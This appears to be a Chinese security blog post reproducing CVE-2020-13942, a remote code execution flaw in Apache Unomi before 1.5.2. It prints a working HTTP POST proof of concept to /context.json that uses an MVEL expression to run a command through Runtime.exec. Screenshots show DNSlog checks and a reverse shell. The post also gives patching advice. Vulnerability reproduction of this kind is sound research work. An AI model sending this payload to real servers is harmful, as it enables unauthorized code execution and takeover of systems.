> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/fQSRXk9FilS4ImUOH5lvuQ)

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjfecDgjrIBicYkuA0gw95KAEltONkgMjqFryHPTyQSuz7wk0RRxD1K03jZUEdELcO8G8DAH4rrAxng/640?wx_fmt=png)

CVE -2020-13942 (Apache Unomi 远程代码执行漏洞)

一、漏洞描述：

Apache Unomi 是一个 Java 开源客户数据平台，这是一个 Java 服务器，旨在管理客户，潜在顾客和访问者的数据，并帮助个性化客户体验。Unomi 可用于在非常不同的系统（例如 CMS，CRM，问题跟踪器，本机移动应用程序等）中集成个性化和配置文件管理。

在 Apache Unomi 1.5.1 版本之前，攻击者可以通过精心构造的 MVEL 或 ONGl 表达式来发送恶意请求，使得 Unomi 服务器执行任意代码，漏洞对应编号为 CVE-2020-11975，而 CVE-2020-13942 漏洞是对 CVE-2020-11975 漏洞的补丁绕过，攻击者绕过补丁检测的黑名单，发送恶意请求，在服务器执行任意代码。

二、影响版本：

Apache Unomi < 1.5.2

三、漏洞复现：

访问页面样式  

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjfecDgjrIBicYkuA0gw95KAEOHpKib4ewvzYmOTeaalVgJRK4xDw7BClwDznOT4p3QERCMDjq4nzic4A/640?wx_fmt=png)

POC：

```
POST /context.json HTTP/1.1
Host: localhost:8181
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0
Content-Length: 486

{
    "filters": [
        {
            "id": "boom",
            "filters": [
                {
                    "condition": {
                         "parameterValues": {
                            "": "script::Runtime r = Runtime.getRuntime(); r.exec(\"gnome-calculator\");"
                        },
                        "type": "profilePropertyCondition"
                    }
                }
            ]
        }
    ],
    "sessionId": "boom"
}
```

```
抓包poc执行：
```

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjfecDgjrIBicYkuA0gw95KAE9QiaPzhHSkNlUxWxVYibyofZaOLC8xsJlQowP70xy2q4ykrR4plyusng/640?wx_fmt=png)

查看 DNSlog 记录：

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjfecDgjrIBicYkuA0gw95KAEybnjsVY5jZckYU54GibckT6s8x49PZqniajHUVRuBbicHbIxeGBBlNoPA/640?wx_fmt=png)

尝试反弹 shell：  

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjfecDgjrIBicYkuA0gw95KAE5q7A6TA0GTfb5966ITSXn9H5UiaoibMfZdXBIHGoU1Eh7OOAmbU68DBg/640?wx_fmt=png)

执行反弹 shell 命令脚本：  

获取 shell

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjfecDgjrIBicYkuA0gw95KAE6rj93l5hibtttg31hPb1nRSu0DkFMwcGpB380jqDwNib9iat7K2gNvxoQ/640?wx_fmt=png)

四、修复方案

1、尽可能避免将用户数据放入表达式解释器中。

2、目前厂商已发布最新版本，请受影响用户及时下载并更新至最新版本。官方链接如下：

https://unomi.apache.org/download.html

参考：

https://nosec.org/home/detail/4611.html

http://hnyongxu.com/index/SecurityIncidents/137.html

https://mp.weixin.qq.com/s/GebQxERJCmULLuRVRXsnYQ（阿乐）

https://github.com/lp008/CVE-2020-13942

免责声明：本站提供安全工具、程序 (方法) 可能带有攻击性，仅供安全研究与教学之用，风险自负!

转载声明：著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。

订阅查看更多复现文章、学习笔记

thelostworld

安全路上，与你并肩前行！！！！

![](https://mmbiz.qpic.cn/mmbiz_jpg/uljkOgZGRjeUdNIfB9qQKpwD7fiaNJ6JdXjenGicKJg8tqrSjxK5iaFtCVM8TKIUtr7BoePtkHDicUSsYzuicZHt9icw/640?wx_fmt=jpeg)

个人知乎：https://www.zhihu.com/people/fu-wei-43-69/columns

个人简书：https://www.jianshu.com/u/bf0e38a8d400

个人 CSDN：https://blog.csdn.net/qq_37602797/category_10169006.html

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcW6VR2xoE3js2J4uFMbFUKgglmlkCgua98XibptoPLesmlclJyJYpwmWIDIViaJWux8zOPFn01sONw/640?wx_fmt=png)